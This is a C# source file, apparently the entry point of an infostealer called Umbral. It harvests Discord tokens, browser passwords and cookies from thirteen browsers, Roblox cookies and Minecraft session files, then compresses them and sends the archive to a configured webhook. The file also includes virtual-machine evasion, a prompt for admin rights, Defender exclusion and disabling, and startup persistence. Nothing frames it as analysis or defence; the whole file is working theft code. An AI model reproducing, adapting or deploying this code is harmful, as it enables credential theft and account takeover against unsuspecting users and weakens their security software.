using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Umbral.payload.Browsers;
using Umbral.payload.Config;
using Umbral.payload.Discord;
using Umbral.payload.Games.Minecraft;
using Umbral.payload.Games.Roblox;
using Umbral.payload.Postman;
using Umbral.payload.Utilities;
using Umbral.payload.Vmprotect;

namespace Umbral.payload
{
    internal class Program
    {
        private static async Task Main(string[] args)
        {
#if DEBUG
            MessageBox.Show("Build payload under RELEASE mode to work.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            Environment.Exit(1);
#endif

            await Process();
            await Run();
        }

        private static async Task Run()
        {
            var archivePath = Path.Combine(Path.GetTempPath(), $"{Common.GenerateRandomString(15)}.ligma");

        retry:
            var tempFolder = Path.Combine(Path.GetTempPath(), Common.GenerateRandomString(15));
            if (Directory.Exists(tempFolder))
                try
                {
                    Directory.Delete(tempFolder, true);
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                    goto retry;
                }

            try
            {
                Directory.CreateDirectory(tempFolder);
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                Environment.Exit(1);
            }

            var getTokens = TokenStealer.GetAccounts();

            var getBravePasswords = Brave.GetPasswords();
            var getChromePasswords = Chrome.GetPasswords();
            var getChromiumPasswords = Chromium.GetPasswords();
            var getComodoPasswords = Comodo.GetPasswords();
            var getEdgePasswords = Edge.GetPasswords();
            var getEpicPrivacyPasswords = EpicPrivacy.GetPasswords();
            var getIridiumPasswords = Iridium.GetPasswords();
            var getOperaPasswords = Opera.GetPasswords();
            var getOperaGxPasswords = OperaGx.GetPasswords();
            var getSlimjetPasswords = Slimjet.GetPasswords();
            var getUrPasswords = UR.GetPasswords();
            var getVivaldiPasswords = Vivaldi.GetPasswords();
            var getYandexPasswords = Yandex.GetPasswords();

            var getBraveCookies = Brave.GetCookies();
            var getChromeCookies = Chrome.GetCookies();
            var getChromiumCookies = Chromium.GetCookies();
            var getComodoCookies = Comodo.GetCookies();
            var getEdgeCookies = Edge.GetCookies();
            var getEpicPrivacyCookies = EpicPrivacy.GetCookies();
            var getIridiumCookies = Iridium.GetCookies();
            var getOperaCookies = Opera.GetCookies();
            var getOperaGxCookies = OperaGx.GetCookies();
            var getSlimjetCookies = Slimjet.GetCookies();
            var getUrCookies = UR.GetCookies();
            var getVivaldiCookies = Vivaldi.GetCookies();
            var getYandexCookies = Yandex.GetCookies();

            var getRobloxCookies = RobloxCookieStealer.GetCookies(getBraveCookies, getChromeCookies, getChromiumCookies, getComodoCookies, getEdgeCookies, getEpicPrivacyCookies, getIridiumCookies, getOperaCookies, getOperaGxCookies, getSlimjetCookies, getUrCookies, getVivaldiCookies, getYandexCookies);

            var getMinecraftFiles = Task.Run(() => false);
            if (Settings.StealMinecraftFiles)
                getMinecraftFiles =
                    MinecraftStealer.StealMinecraftFiles(Path.Combine(tempFolder, "Games", "Minecraft"));
            else
                await Task.WhenAll(getTokens, getBravePasswords, getChromePasswords, getChromiumPasswords, getComodoPasswords,
                    getEdgePasswords, getEpicPrivacyPasswords, getIridiumPasswords, getOperaPasswords, getOperaGxPasswords,
                    getSlimjetPasswords, getUrPasswords, getVivaldiPasswords, getYandexPasswords, getBraveCookies,
                    getChromeCookies, getChromiumCookies, getComodoCookies, getEdgeCookies, getEpicPrivacyCookies,
                    getIridiumCookies, getOperaCookies, getOperaGxCookies, getSlimjetCookies, getUrCookies,
                    getVivaldiCookies, getYandexCookies, getMinecraftFiles, getRobloxCookies);

            var discordAccounts = await getTokens;

            var bravePasswords = await getBravePasswords;
            var chromePasswords = await getChromePasswords;
            var chromiumPasswords = await getChromiumPasswords;
            var comodoPasswords = await getComodoPasswords;
            var edgePasswords = await getEdgePasswords;
            var epicPrivacyPasswords = await getEpicPrivacyPasswords;
            var iridiumPasswords = await getIridiumPasswords;
            var operaPasswords = await getOperaPasswords;
            var operaGxPasswords = await getOperaGxPasswords;
            var slimjetPasswords = await getSlimjetPasswords;
            var urPasswords = await getUrPasswords;
            var vivaldiPasswords = await getVivaldiPasswords;
            var yandexPasswords = await getYandexPasswords;

            var braveCookies = await getBraveCookies;
            var chromeCookies = await getChromeCookies;
            var chromiumCookies = await getChromiumCookies;
            var comodoCookies = await getComodoCookies;
            var edgeCookies = await getEdgeCookies;
            var epicPrivacyCookies = await getEpicPrivacyCookies;
            var iridiumCookies = await getIridiumCookies;
            var operaCookies = await getOperaCookies;
            var operaGxCookies = await getOperaGxCookies;
            var slimjetCookies = await getSlimjetCookies;
            var urCookies = await getUrCookies;
            var vivaldiCookies = await getVivaldiCookies;
            var yandexCookies = await getYandexCookies;

            var robloxCookies = await getRobloxCookies;

            var gotMinecraftFiles = await getMinecraftFiles ? 1 : 0;

            var saveProcesses = new List<Task>();
            var cookiesCount = 0;
            var passwordsCount = 0;
            var discordTokenCount = 0;
            var robloxCookieCount = 0;

            if (discordAccounts.Length > 0 && Settings.StealDiscordtokens)
            {
                var saveTo = Path.Combine(tempFolder, "Discord");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(discordAccounts, Path.Combine(saveTo, "Discord Accounts.txt")));
                discordTokenCount += discordAccounts.Length;
            }

            #region StealPaswords

            if (bravePasswords.Length > 0 && Settings.StealPasswords)
            {
                var saveTo = Path.Combine(tempFolder, "Browsers", "Passwords");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(bravePasswords, Path.Combine(saveTo, "Brave Passwords.txt")));
                passwordsCount += bravePasswords.Length;
            }

            if (chromePasswords.Length > 0 && Settings.StealPasswords)
            {
                var saveTo = Path.Combine(tempFolder, "Browsers", "Passwords");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(chromePasswords, Path.Combine(saveTo, "Chrome Passwords.txt")));
                passwordsCount += chromePasswords.Length;
            }

            if (chromiumPasswords.Length > 0 && Settings.StealPasswords)
            {
                var saveTo = Path.Combine(tempFolder, "Browsers", "Passwords");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(bravePasswords, Path.Combine(saveTo, "Chromium Passwords.txt")));
                passwordsCount += chromiumPasswords.Length;
            }

            if (comodoPasswords.Length > 0 && Settings.StealPasswords)
            {
                var saveTo = Path.Combine(tempFolder, "Browsers", "Passwords");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(comodoPasswords, Path.Combine(saveTo, "Comodo Dragon Passwords.txt")));
                passwordsCount += comodoPasswords.Length;
            }

            if (edgePasswords.Length > 0 && Settings.StealPasswords)
            {
                var saveTo = Path.Combine(tempFolder, "Browsers", "Passwords");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(edgePasswords, Path.Combine(saveTo, "Edge Passwords.txt")));
                passwordsCount += edgePasswords.Length;
            }

            if (epicPrivacyPasswords.Length > 0 && Settings.StealPasswords)
            {
                var saveTo = Path.Combine(tempFolder, "Browsers", "Passwords");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(epicPrivacyPasswords, Path.Combine(saveTo, "Epic Privacy Passwords.txt")));
                passwordsCount += epicPrivacyPasswords.Length;
            }

            if (iridiumPasswords.Length > 0 && Settings.StealPasswords)
            {
                var saveTo = Path.Combine(tempFolder, "Browsers", "Passwords");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(iridiumPasswords, Path.Combine(saveTo, "Iridium Passwords.txt")));
                passwordsCount += iridiumPasswords.Length;
            }

            if (operaPasswords.Length > 0 && Settings.StealPasswords)
            {
                var saveTo = Path.Combine(tempFolder, "Browsers", "Passwords");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(operaPasswords, Path.Combine(saveTo, "Opera Passwords.txt")));
                passwordsCount += operaPasswords.Length;
            }

            if (operaGxPasswords.Length > 0 && Settings.StealPasswords)
            {
                var saveTo = Path.Combine(tempFolder, "Browsers", "Passwords");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(operaGxPasswords, Path.Combine(saveTo, "Opera GX Passwords.txt")));
                passwordsCount += operaGxPasswords.Length;
            }

            if (slimjetPasswords.Length > 0 && Settings.StealPasswords)
            {
                var saveTo = Path.Combine(tempFolder, "Browsers", "Passwords");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(slimjetPasswords, Path.Combine(saveTo, "Slimjet Passwords.txt")));
                passwordsCount += slimjetPasswords.Length;
            }

            if (urPasswords.Length > 0 && Settings.StealPasswords)
            {
                var saveTo = Path.Combine(tempFolder, "Browsers", "Passwords");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(urPasswords, Path.Combine(saveTo, "UR Browser Passwords.txt")));
                passwordsCount += urPasswords.Length;
            }

            if (vivaldiPasswords.Length > 0 && Settings.StealPasswords)
            {
                var saveTo = Path.Combine(tempFolder, "Browsers", "Passwords");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(vivaldiPasswords, Path.Combine(saveTo, "Vivaldi Passwords.txt")));
                passwordsCount += vivaldiPasswords.Length;
            }

            if (yandexPasswords.Length > 0 && Settings.StealPasswords)
            {
                var saveTo = Path.Combine(tempFolder, "Browsers", "Passwords");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(yandexPasswords, Path.Combine(saveTo, "Yandex Passwords.txt")));
                passwordsCount += yandexPasswords.Length;
            }

            #endregion

            #region StealCookies

            if (braveCookies.Length > 0 && Settings.StealCookies)
            {
                var saveTo = Path.Combine(tempFolder, "Browsers", "Cookies");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(braveCookies, Path.Combine(saveTo, "Brave Cookies.txt")));
                cookiesCount += braveCookies.Length;
            }

            if (chromeCookies.Length > 0 && Settings.StealCookies)
            {
                var saveTo = Path.Combine(tempFolder, "Browsers", "Cookies");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(chromeCookies, Path.Combine(saveTo, "Chrome Cookies.txt")));
                cookiesCount += chromeCookies.Length;
            }

            if (chromiumCookies.Length > 0 && Settings.StealCookies)
            {
                var saveTo = Path.Combine(tempFolder, "Browsers", "Cookies");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(braveCookies, Path.Combine(saveTo, "Chromium Cookies.txt")));
                cookiesCount += chromiumCookies.Length;
            }

            if (comodoCookies.Length > 0 && Settings.StealCookies)
            {
                var saveTo = Path.Combine(tempFolder, "Browsers", "Cookies");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(comodoCookies, Path.Combine(saveTo, "Comodo Dragon Cookies.txt")));
                cookiesCount += comodoCookies.Length;
            }

            if (edgeCookies.Length > 0 && Settings.StealCookies)
            {
                var saveTo = Path.Combine(tempFolder, "Browsers", "Cookies");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(edgeCookies, Path.Combine(saveTo, "Edge Cookies.txt")));
                cookiesCount += edgeCookies.Length;
            }

            if (epicPrivacyCookies.Length > 0 && Settings.StealCookies)
            {
                var saveTo = Path.Combine(tempFolder, "Browsers", "Cookies");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(epicPrivacyCookies, Path.Combine(saveTo, "Epic Privacy Cookies.txt")));
                cookiesCount += epicPrivacyCookies.Length;
            }

            if (iridiumCookies.Length > 0 && Settings.StealCookies)
            {
                var saveTo = Path.Combine(tempFolder, "Browsers", "Cookies");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(iridiumCookies, Path.Combine(saveTo, "Iridium Cookies.txt")));
                cookiesCount += iridiumCookies.Length;
            }

            if (operaCookies.Length > 0 && Settings.StealCookies)
            {
                var saveTo = Path.Combine(tempFolder, "Browsers", "Cookies");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(operaCookies, Path.Combine(saveTo, "Opera Cookies.txt")));
                cookiesCount += operaCookies.Length;
            }

            if (operaGxCookies.Length > 0 && Settings.StealCookies)
            {
                var saveTo = Path.Combine(tempFolder, "Browsers", "Cookies");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(operaGxCookies, Path.Combine(saveTo, "Opera GX Cookies.txt")));
                cookiesCount += operaGxCookies.Length;
            }

            if (slimjetCookies.Length > 0 && Settings.StealCookies)
            {
                var saveTo = Path.Combine(tempFolder, "Browsers", "Cookies");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(slimjetCookies, Path.Combine(saveTo, "Slimjet Cookies.txt")));
                cookiesCount += slimjetCookies.Length;
            }

            if (urCookies.Length > 0 && Settings.StealCookies)
            {
                var saveTo = Path.Combine(tempFolder, "Browsers", "Cookies");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(urCookies, Path.Combine(saveTo, "UR Browser Cookies.txt")));
                cookiesCount += urCookies.Length;
            }

            if (vivaldiCookies.Length > 0 && Settings.StealCookies)
            {
                var saveTo = Path.Combine(tempFolder, "Browsers", "Cookies");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(vivaldiCookies, Path.Combine(saveTo, "Vivaldi Cookies.txt")));
                cookiesCount += vivaldiCookies.Length;
            }

            if (yandexCookies.Length > 0 && Settings.StealCookies)
            {
                var saveTo = Path.Combine(tempFolder, "Browsers", "Cookies");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(yandexCookies, Path.Combine(saveTo, "Yandex Cookies.txt")));
                cookiesCount += yandexCookies.Length;
            }

            if (robloxCookies.Length > 0 && Settings.StealRobloxCookies)
            {
                var saveTo = Path.Combine(tempFolder, "Games", "Roblox");
                Directory.CreateDirectory(saveTo);
                saveProcesses.Add(SaveData.SaveToFile(robloxCookies, Path.Combine(saveTo, "Roblox Cookies.txt")));
                robloxCookieCount += robloxCookies.Length;
            }

            #endregion

            await Task.WhenAll(saveProcesses);
            if (Common.Compress(tempFolder, archivePath))
            {
                await Sender.Post(archivePath, new Dictionary<string, int>
                {
                    { "Cookies", cookiesCount },
                    { "Passwords", passwordsCount },
                    { "Discord Tokens", discordTokenCount },
                    { "Minecraft Session Files", gotMinecraftFiles },
                    { "Roblox Cookies", robloxCookieCount }
                });
                File.Delete(archivePath);
            }
            else
            {
                Console.WriteLine("Could not compress file");
            }

            Directory.Delete(tempFolder, true);
        }

        private static async Task Process()
        {
            if (string.IsNullOrWhiteSpace(Settings.WebhookUrl)) Environment.Exit(1); // Empty webhook

            Syscalls.RegisterMutex();

            while (!await Common.IsConnectionAvailable())
                Thread.Sleep(60000); // Connection available. Retry every 1 min.

            if (Settings.VmProtect &&
                Detector.IsVirtualMachine()) Environment.Exit(1); // Exit if virtual machine is detected.

            if (!Common.IsInStartup())
            {
                Syscalls.AskForAdmin(); // Prompts user to give admin privileges
            }

            Syscalls.DefenderExclude(Application.ExecutablePath); // Tries to add itself to Defender exclusions
            Syscalls.DisableDefender(); // Tries to disable defender. Fails if tamper protection is enabled.

            if (!Common.IsInStartup() && Settings.Startup && Syscalls.CheckAdminPrivileges()) 
                Common.PutInStartup(); // Puts itself in startup
        }
    }
}